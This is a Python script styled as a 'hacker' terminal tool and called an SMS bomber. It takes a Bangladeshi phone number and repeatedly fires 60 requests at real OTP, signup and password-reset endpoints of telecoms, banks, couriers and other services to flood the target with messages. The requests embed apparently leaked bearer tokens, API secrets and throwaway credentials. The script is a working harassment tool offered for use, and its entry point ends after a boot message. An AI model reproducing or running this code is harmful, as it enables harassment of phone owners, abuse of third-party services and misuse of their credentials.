#!/usr/bin/env python3
# CODE START BY RUBISH

import os, sys, time, random, string, json, urllib3, base64
import logging, platform, importlib, hashlib
import requests
from requests.structures import CaseInsensitiveDict
from rich.progress import track
from rich.align import Align
from rich.panel import Panel
from rich.console import Console
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.layout import Layout
from rich.box import DOUBLE, HEAVY, ROUNDED

os.system("clear")
console = Console()

# ---------------- Terminal Title ----------------
sys.stdout.write(f'\x1b[1;35m\x1b]2;🔥 RUBISH BOMBER v3.0 🔥\x07')

# ---------- HACKER COLOR PALETTE ----------
NEON_GREEN = "\033[38;5;46m"
NEON_PINK = "\033[38;5;201m"
NEON_CYAN = "\033[38;5;51m"
NEON_PURPLE = "\033[38;5;141m"
NEON_YELLOW = "\033[38;5;226m"
NEON_RED = "\033[38;5;196m"
DARK_GRAY = "\033[38;5;238m"
RESET = "\033[0m"
BOLD = "\033[1m"

# ---------- UTILITY FUNCTIONS ----------
def type_write(text, delay=0.005):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def glitch_text(text, delay=0.02):
    """Simulate glitch effect"""
    chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
    for _ in range(3):
        glitched = ''.join(random.choice(chars) if random.random() < 0.3 else c for c in text)
        sys.stdout.write(f"\r{NEON_PINK}{glitched}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write(f"\r{NEON_GREEN}{text}{RESET}\n")

def matrix_rain(duration=2):
    """Matrix-style rain effect"""
    cols = os.get_terminal_size().columns
    chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01"
    end_time = time.time() + duration
    while time.time() < end_time:
        line = ''.join(random.choice(chars) if random.random() < 0.1 else ' ' for _ in range(cols))
        print(f"\033[38;5;46m{line}{RESET}")
        time.sleep(0.05)

def progress_scan(text):
    """Hacker-style scanning progress"""
    for i in track(range(50), description=f"{NEON_CYAN}[{NEON_GREEN}⚡{NEON_CYAN}] {text}"):
        time.sleep(0.01)

def Lxj(t):
    for x in t:
        sys.stdout.write(x); sys.stdout.flush(); time.sleep(0.003)

def LijA(t):
    for x in t:
        sys.stdout.write(x); sys.stdout.flush(); time.sleep(0.001)

def RUBISH(message):
    for i in track(range(40), description=f"{message}"): time.sleep(0.01)

# ---------- COLORS ----------
a="\033[1;30m"; r="\033[1;31m"; g="\033[1;32m"
y="\033[1;33m"; b="\033[1;34m"; p="\033[1;35m"
c="\033[1;36m"; w="\033[1;37m"; bgr="\033[41m"
stp="\033[1;0m"; itl="\033[1;3m"; unl="\033[1;4m"
lgt="\033[1;1m"

# ---------- USER AGENTS ----------
lmnXuserAgent1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
lmnXuserAgent2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
lmnXuserAgent3 = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
lmnXuserAgent4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
lmnXuserAgent5 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
lmnXuserAgent6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
lmnXuserAgent7 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
lmnXuserAgent8 = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
lmnXuserAgent9 = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36'
lmnXuserAgent10 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)'
lmnXuserAgent11 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1'

lmnXaccessVersion1 = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
lmnXaccessVersion2 = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

RQS_ERR = fr"    [/]  REQUESTS ERROR"

# ---------- SECURITY CHECK ----------
try:
    ipv = requests.get("https://ident.me/json-api").json()
    ip = ipv["ip"]
    info = requests.get("https://ipinfo.io/widget/demo/"+ip).json()
    address = info["data"]["abuse"]["address"]
except:
    ip = None
    address = None

# =========================================================
#              ADVANCED HACKER BANNER
# =========================================================

BANNER_ART = r"""
   ██████╗ ██╗   ██╗██████╗ ██╗███████╗██╗  ██╗
   ██╔══██╗██║   ██║██╔══██╗██║██╔════╝██║  ██║
   ██████╔╝██║   ██║██████╔╝██║███████╗███████║
   ██╔══██╗██║   ██║██╔══██╗██║╚════██║██╔══██║
   ██║  ██║╚██████╔╝██████╔╝██║███████║██║  ██║
   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝
"""

SKULL_ART = r"""
        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        ██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ██
        ██  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ██
        ██  ████████▀▀▀▀▀▀▀▀▀▀▀▀████████  ██
        ██  ██████▀  ▄▄▄▄▄▄▄▄▄  ▀██████  ██
        ██  ████▀  ▄███████████▄  ▀████  ██
        ██  ███   ███████████████   ███  ██
        ██  ███  ████  ███  ████  ████  ██
        ██  ███  ████  ███  ████  ████  ██
        ██  ███   ███████████████   ███  ██
        ██  ████▄  ▀███████████▀  ▄████  ██
        ██  ██████▄  ▀▀▀▀▀▀▀▀▀  ▄██████  ██
        ██  ████████▄▄▄▄▄▄▄▄▄▄▄▄████████  ██
        ██  ██████████████████████████  ██
        ██ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ██
        ██████████████████████████████████
"""

def print_advanced_banner():
    os.system("clear")
    # Top border
    cols = os.get_terminal_size().columns
    print(f"\n{NEON_PINK}{'═' * cols}{RESET}")
    
    # ASCII Art with gradient
    for line in BANNER_ART.split('\n'):
        print(f"{NEON_PINK}{BOLD}{line.center(cols)}{RESET}")
    
    # Subtitle
    print(f"\n{NEON_CYAN}{'─' * cols}{RESET}")
    subtitle = "◤  ADVANCED SMS BOMBER  ◢  v3.0  ◣  BY RUBISH  ◢"
    print(f"{NEON_GREEN}{BOLD}{subtitle.center(cols)}{RESET}")
    print(f"{NEON_CYAN}{'─' * cols}{RESET}\n")

def print_hacker_header():
    """Print advanced hacker-style header with skull"""
    cols = os.get_terminal_size().columns
    console.print(Align.center(f"[bold {NEON_RED}]{SKULL_ART}[/]"))
    console.print(Align.center(Panel.fit(
        "[bold #ff00ff]⚡ RUBISH BOMBER ⚡[/]\n"
        "[bold cyan]━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/]\n"
        "[bold yellow]>> Advanced SMS Spammer Tool <<[/]",
        border_style="bold magenta",
        box=DOUBLE
    )))
    print()

def lnx():
    print("\n")
    console.rule(style="bold magenta")
    print("\n")

def war():
    console.print(Align.center(
        "[bold white][[bold red]⚠ WARNING ⚠[bold white]] "
        "[bold red]1 Round [bold white]= [bold green]60 SPAM REQUESTS"
    ))
    print()

# =========================================================
#                     MAIN INPUT UI
# =========================================================

def BCS():
    os.system("clear")
    print_advanced_banner()
    
    # Info Panel
    info_table = Table(box=ROUNDED, border_style="bold cyan", show_header=False)
    info_table.add_column(justify="center")
    info_table.add_row(f"[bold #ff00ff]💀 SYSTEM READY 💀[/]")
    info_table.add_row(f"[bold cyan]⚡ NEON BOMBER ENGINE ONLINE ⚡[/]")
    if ip:
        info_table.add_row(f"[bold green]🌐 YOUR IP: [bold yellow]{ip}[/]")
    console.print(Align.center(info_table))
    print()
    
    # Input with animation
    console.print(Align.center("[bold #00ff00]▼ ▼ ▼  ENTER TARGET INFO  ▼ ▼ ▼[/]"))
    print()
    
    number = input(f"\n  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} TARGET NUMBER {NEON_CYAN}]──►{NEON_GREEN} +88 {RESET}")
    lnx()
    
    if not number.isdigit() or len(number) != 11:
        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
        time.sleep(2); BCS()
    elif "RUBISH" in number:
        Lxj(f"{NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Invalid Number ! Try Again{RESET}")
        time.sleep(2); BCS()
    
    try:
        war()
        amo = int(input(f"  {NEON_CYAN}┌─[{NEON_GREEN}◉{NEON_CYAN}]─[{NEON_PINK} SPAM ROUNDS  {NEON_CYAN}]──►{NEON_GREEN} {RESET}"))
    except ValueError:
        lnx()
        Lxj(f" {NEON_RED}  └─[{NEON_YELLOW}✗{NEON_RED}]─ Amount Must Be A Number !{RESET}")
        time.sleep(2); BCS()
    
    DARKS(number, amo)

# =========================================================
#                    API FUNCTIONS (Unchanged)
# =========================================================

def lmnXlija_1(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'device_identifier': 'undefined',
            'device_name': 'undefined',
            'origin': 'https://go.paperfly.com.bd',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://go.paperfly.com.bd/',
            'sec-ch-ua': lmnXaccessVersion1,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {
            'full_name': 'Rubish Khan',
            'company_name': 'rubish',
            'email_address': 'rubish9689@gmail.com',
            'phone_number': number,
        }
        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', headers=headers, json=json_data)
    except: pass

def lmnXlija_2(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://ghoorilearning.com',
            'referer': 'https://ghoorilearning.com/',
            'user-agent': lmnXuserAgent2,
        }
        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', params={'_app_platform': 'web'}, headers=headers, json={'mobile_no': number})
    except: pass

def lmnXlija_3(number):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://doctime.com.bd',
            'referer': 'https://doctime.com.bd/',
            'user-agent': lmnXuserAgent2,
        }
        json_data = {'data': {'country_calling_code': '88', 'contact_no': number, 'headers': {'PlatForm': 'Web'}}}
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers=headers, json=json_data)
    except: pass

def lmnXlija_4(number):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://customer.sundarbancourierltd.com',
            'referer': 'https://customer.sundarbancourierltd.com/',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {
            'operationName': 'CreateAccessToken',
            'variables': {'accessTokenFilter': {'userName': number}},
            'query': 'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}',
        }
        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', headers=headers, json=json_data)
    except: pass

def lmnXlija_5(number):
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': 'https://apex4u.com', 'referer': 'https://apex4u.com/', 'user-agent': lmnXuserAgent1}
        requests.post('https://api.apex4u.com/api/auth/login', headers=headers, json={'phoneNumber': number})
    except: pass

def lmnXlija_6(number):
    try:
        requests.post("https://webapi.robi.com.bd/v1/send-otp", json={"phone_number": number, "type": "doorstep"}, headers={"Content-Type": "application/json"})
    except: pass

def lmnXlija_7(number):
    try:
        requests.get('https://web-api.banglalink.net/api/v1/user/number/validation/'+number, headers={'User-Agent': lmnXuserAgent1})
    except: pass

def lmnXlija_8(number):
    try:
        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'mobile': number})
    except: pass

def lmnXlija_9(number):
    try:
        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': lmnXuserAgent1}, data={'msisdn': number})
    except: pass

def lmnXlija_10(number):
    try:
        requests.post('https://webapi.robi.com.bd/v1/send-otp', headers={'Content-Type': 'application/json'}, json={'phone_number': number, 'type': 'my_offer'})
    except: pass

def lmnXlija_11(number):
    try:
        requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": number}, headers={"Content-Type": "application/json"})
    except: pass

def lmnXlija_12(number):
    try:
        requests.post('https://webapi.robi.com.bd/v1/chat/send-otp', headers={'Content-Type': 'application/json'}, json={'phone_number': number, 'name': 'Rubish Khan', 'type': 'video-chat'})
    except: pass

def lmnXlija_13(number):
    try:
        requests.post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phoneNumber': number})
    except: pass

def lmnXlija_14(number):
    try:
        requests.post('https://fundesh.com.bd/api/auth/generateOTP', params={'service_key': ''}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'msisdn': number})
    except: pass

def lmnXlija_15(number):
    try:
        requests.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', params={'phone': number}, headers={'User-Agent': lmnXuserAgent1})
    except: pass

def lmnXlija_16(number):
    try:
        requests.post('https://api.motionview.com.bd/api/send-otp-phone-signup', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': number})
    except: pass

def lmnXlija_17(number):
    try:
        requests.post('https://api-dynamic.chorki.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'number': '+88'+number})
    except: pass

def lmnXlija_18(number):
    try:
        requests.post('https://user-api.jslglobal.co:444/v2/send-otp', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': '+88'+number, 'jatri_token': 'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})
    except: pass

def lmnXlija_19(number):
    try:
        requests.get('https://chinaonlinebd.com/api/login/getOtp', params={'phone': number}, headers={'User-Agent': lmnXuserAgent1, 'token': '45601f3d391886fcec5f5a3f26780f21'})
    except: pass

def lmnXlija_20(number):
    try:
        requests.post('https://api.deeptoplay.com/v2/auth/login', params={'country': 'BD', 'platform': 'web', 'language': 'en'}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'number': '+88'+number})
    except: pass

def lmnXlija_21(number):
    try:
        requests.post('https://api.shikho.com/auth/v2/send/sms', headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent1}, json={'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'})
    except: pass

def lmnXlija_22(number):
    try:
        headers5 = CaseInsensitiveDict()
        headers5["Content-Type"] = "application/json"
        headers5["User-Agent"] = lmnXuserAgent3
        data5 = '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
        requests.post("https://api.redx.com.bd/v1/user/signup", headers=headers5, data=data5)
    except: pass

def lmnXlija_23(number):
    try: requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
    except: pass

def lmnXlija_24(number):
    try: requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp')
    except: pass

def lmnXlija_25(number):
    try: requests.post('https://ss.binge.buzz/otp/send/login'+number)
    except: pass

def lmnXlija_26(number):
    try:
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        requests.post("https://fundesh.com.bd/api/auth/generateOTP?service_key=", headers=headers3, data='{"msisdn":"'+number+'"}')
    except: pass

def lmnXlija_27(number):
    try:
        requests.post("https://applink.com.bd/appstore-v4-server/login/otp/request", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"msisdn": "88"+number}), verify=False)
    except: pass

def lmnXlija_28(number):
    try:
        requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile_number": number}), verify=False)
    except: pass

def lmnXlija_29(number):
    try:
        requests.post("https://chokrojan.com/api/v1/passenger/login/mobile", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile_number": number}))
    except: pass

def lmnXlija_30(number):
    try:
        requests.post("https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}), verify=False)
    except: pass

def lmnXlija_31(number):
    try:
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', headers={'Content-type': 'application/json', 'User-Agent': lmnXuserAgent4}, data=json.dumps({'data': {'code': '88', 'contact_no': number, 'country_calling_code': '88', 'headers': {'PlatForm': 'Web'}}}), verify=False)
    except: pass

def lmnXlija_32(number):
    try:
        requests.post("https://core.easy.com.bd/api/v1/registration", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"name": "Rubish Khan", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": number, "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}), verify=False)
    except: pass

def lmnXlija_33(number):
    try:
        requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"type": "phone", "phone": number}), verify=False)
    except: pass

def lmnXlija_34(number):
    try:
        requests.post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber', json={'AccessToken': '', 'TrackingNo': '', 'mobileNo': number, 'otpSms': '', 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent4})
    except: pass

def lmnXlija_35(number):
    try:
        requests.post(f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D", json={"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}, headers={"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"})
    except: pass

def lmnXlija_36(number):
    try:
        requests.post("https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent5})
    except: pass

def lmnXlija_37(number):
    try:
        requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"})
    except: pass

def lmnXlija_38(number):
    try: requests.get(f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}", verify=False)
    except: pass

def lmnXlija_39(number):
    try:
        requests.post("https://smart1216.robi.com.bd/robi_sivr/public/login/phone", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, json={"cli": number.lstrip('0')}, verify=False)
    except: pass

def lmnXlija_40(number):
    try:
        requests.post("https://user-api.jslglobal.co:444/v1/send-otp", headers={"User-Agent": lmnXuserAgent6}, data={"phone": "+88"+number, "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}, verify=False)
    except: pass

def lmnXlija_41(number):
    try:
        requests.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", headers={"User-Agent": lmnXuserAgent7, "Content-Type": "application/x-www-form-urlencoded"}, data={"PhoneNumber": number}, verify=False)
    except: pass

def lmnXlija_42(number):
    try:
        requests.post("https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT", headers={"Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json"}, data=json.dumps({"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro"+number+"@gmail.com", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": number, "storefront_id": "5"}), verify=False)
    except: pass

def lmnXlija_43(number):
    try:
        requests.post("https://api.englishmojabd.com/api/v1/auth/login", data=json.dumps({"phone": "+88"+number}), headers={"Content-Type": "application/json"})
    except: pass

def lmnXlija_44(number):
    try:
        requests.post("https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"phone": number}), verify=False)
    except: pass

def lmnXlija_45(number):
    try:
        requests.post("https://api.osudpotro.com/api/v1/users/send_otp", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"mobile": "+88-"+number, "deviceToken": "app", "language": "bn", "os": "android"}), verify=False)
    except: pass

def lmnXlija_46(number):
    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0", headers={"user-agent": lmnXuserAgent8}, verify=False)
    except: pass

def lmnXlija_47(number):
    try:
        requests.post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, data=json.dumps({"full_name": "Rubish Khan", "company_name": "Rubish", "email_address": "rubish@gmail.com", "phone_number": number}), verify=False)
    except: pass

def lmnXlija_48(number):
    try:
        requests.post("https://auth.qcoom.com/api/v1/otp/send", json={"mobileNumber": "+88"+number}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
    except: pass

def lmnXlija_49(number):
    try:
        requests.post("https://reseller.circle.com.bd/api/v2/auth/signup", json={"name": "+88"+number, "email_or_phone": "+88"+number, "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}, headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent7})
    except: pass

def lmnXlija_50(number):
    try:
        requests.post("https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4, "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"}, json={"phone": number}, verify=False)
    except: pass

def lmnXlija_51(number):
    try:
        requests.post("https://api-gateway.sundarbancourierltd.com/graphql", json={"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n    message\n    statusCode\n    result {\n      phone\n      otpCounter\n    }\n  }\n}"}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent10})
    except: pass

def lmnXlija_52(number):
    try:
        requests.post("https://api.toybox.live/bdapps_handler.php", headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent11}, data=json.dumps({"Operation": "CreateSubscription", "MobileNumber": "88"+number, "PackageID": 100, "Secret": "HJKX71%UHYH"}))
    except: pass

def lmnXlija_53(number):
    try: requests.get("https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number, headers={'sourcePlatform': 'web', 'client': '2'})
    except: pass

def lmnXlija_54(number):
    try:
        requests.post("https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", json={"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osFirmWireBuild": "", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "Gp", "walletNumber": number}, headers={"Content-Type": "application/json"})
    except: pass

def lmnXlija_55(number):
    try:
        requests.post("https://rootsedulive.com/api/auth/register", data={"name": "Rubish Khan", "phone": f"88{number}", "email": f"subap{number}agli2023@gmail.com", "password": "iDSnWh6rzp9KNAY", "confirmPassword": "iDSnWh6rzp9KNAY"}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
    except: pass

def lmnXlija_56(number):
    try:
        requests.post("https://rootsedulive.com/api/auth/forget-password", data={"phoneOrEmail": f"88{number}"}, headers={"Content-Type": "application/x-www-form-urlencoded"}, verify=False)
    except: pass

def lmnXlija_57(number):
    try:
        requests.post("https://www.mcbaffiliate.com/Affiliate/RequestOTP", data={"PhoneNumber": number}, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": lmnXuserAgent7}, verify=False)
    except: pass

def lmnXlija_58(number):
    try:
        requests.post(f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
    except: pass

def lmnXlija_59(number):
    try:
        requests.post("https://bkshopthc.gramreenphone.com/api/v1/fwa/request-for-otp", json={"phone": number, "email": "", "language": "en"}, headers={'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent9}, verify=False)
    except: pass

def lmnXlija_60(number):
    try:
        requests.post(f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/", headers={"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}, verify=False)
    except: pass

# =========================================================
#               ADVANCED ATTACK MENU
# =========================================================

def DARKS(number, amo):
    os.system("clear")
    print_advanced_banner()
    
    # Attack info panel
    console.print(Align.center(
        Panel.fit(
            f"[bold {NEON_PINK}]╔══════════════════════════════════════╗[/]\n"
            f"[bold {NEON_PINK}]║[/]  [bold {NEON_YELLOW}]⚡ BOMBING SEQUENCE INITIATED ⚡[/] [bold {NEON_PINK}]║[/]\n"
            f"[bold {NEON_PINK}]╚══════════════════════════════════════╝[/]\n\n"
            f"[bold {NEON_CYAN}]┌─────────────────────────────────────┐[/]\n"
            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]TARGET  ►[/] [bold {NEON_YELLOW}]+88 {number}[/]\n"
            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]ROUNDS  ►[/] [bold {NEON_RED}]{amo}[/]\n"
            f"[bold {NEON_CYAN}]│[/] [bold {NEON_GREEN}]APIs    ►[/] [bold {NEON_PURPLE}]60 ACTIVE[/]\n"
            f"[bold {NEON_CYAN}]└─────────────────────────────────────┘[/]",
            border_style=f"bold {NEON_PINK}",
            box=DOUBLE
        )
    ))
    
    print()
    console.rule(f"[bold {NEON_PINK}]◤ BOMBARDMENT STARTED ◢[/]", style=f"bold {NEON_PINK}")
    print()
    
    # Round counter display
    total_sent = 0
    for x in range(amo):
        x += 1
        print(f"\n{NEON_CYAN}┏━━━ [ ROUND {NEON_YELLOW}{x}{NEON_CYAN} / {NEON_YELLOW}{amo}{NEON_CYAN} ] ━━━{RESET}")
        
        for i in range(1, 61):
            try:
                func = globals()[f"lmnXlija_{i}"]
                func(number)
            except: pass
            total_sent += 1
            # Compact progress indicator
            bar_len = 30
            filled = int(bar_len * i / 60)
            bar = f"{NEON_GREEN}{'█' * filled}{DARK_GRAY}{'░' * (bar_len - filled)}{RESET}"
            sys.stdout.write(f"\r  {NEON_CYAN}[{bar}{NEON_CYAN}] {NEON_YELLOW}{i:02d}/60{RESET}  {NEON_PINK}💣{RESET}")
            sys.stdout.flush()
        
        print()
    
    print()
    console.rule(style=f"bold {NEON_PINK}")
    console.print(Align.center(
        Panel.fit(
            f"[bold {NEON_GREEN}]✓ ATTACK COMPLETED SUCCESSFULLY ✓[/]\n"
            f"[bold {NEON_YELLOW}]Total SMS Sent: [bold {NEON_RED}]{total_sent}[/]\n"
            f"[bold {NEON_CYAN}]Target: [bold {NEON_YELLOW}]+88 {number}[/]",
            border_style=f"bold {NEON_GREEN}",
            box=DOUBLE
        )
    ))
    print()
    
    rull = input(f"  {NEON_CYAN}┌─[{NEON_GREEN}?{NEON_CYAN}]─[{NEON_PINK} RUN AGAIN? {NEON_CYAN}]──►{NEON_GREEN} y/n {RESET}")
    if rull.lower() == "y":
        os.system("clear")
        BCS()
    else:
        console.print(Align.center(f"\n[bold {NEON_RED}]◤ EXITING... STAY GHOST ◢[/]\n"))
        sys.exit(0)

# =========================================================
#                    ENTRY POINT
# =========================================================

if __name__ == "__main__":
    os.system("clear")
    # Boot animation
    console.print(Align.center(f"[bold {NEON_GREEN}]◤ INITIALIZING SYSTEM ◢[/]"))
